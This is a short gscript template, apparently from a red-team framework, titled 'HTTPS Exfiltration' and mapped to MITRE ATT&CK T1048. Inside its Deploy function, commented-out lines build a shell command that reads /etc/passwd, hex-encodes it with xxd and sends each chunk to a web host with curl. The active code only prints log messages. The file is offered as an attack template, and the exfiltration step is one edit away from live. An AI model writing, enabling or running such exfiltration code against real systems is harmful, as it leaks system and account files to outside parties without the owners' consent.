// Example gscript template
// Title: HTTPS Exfiltration
// Author: ahhh
// Purpose: read a file, encode it, send json to a webserver
// Gscript version: 1.0.0
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1048

//priority:90
//timeout:150
//import:/private/tmp/example.macho

var url = "https://example.com/";
var target_file = "/etc/passwd";

function Deploy() {
    console.log("starting HTTPS Exfiltration");

    // Ghetto exfil the target
    //var target_url = url+"$i";
    //var command = "/bin/cat "+target_file+" | xxd -ps -c 16 | while read i; do curl "+target_url+"; done;";
    //var response = G.exec.ExecuteCommand("/bin/sh", ["-c", command]);

    
    console.log("done, HTTPS Exfiltration");
    return true;

}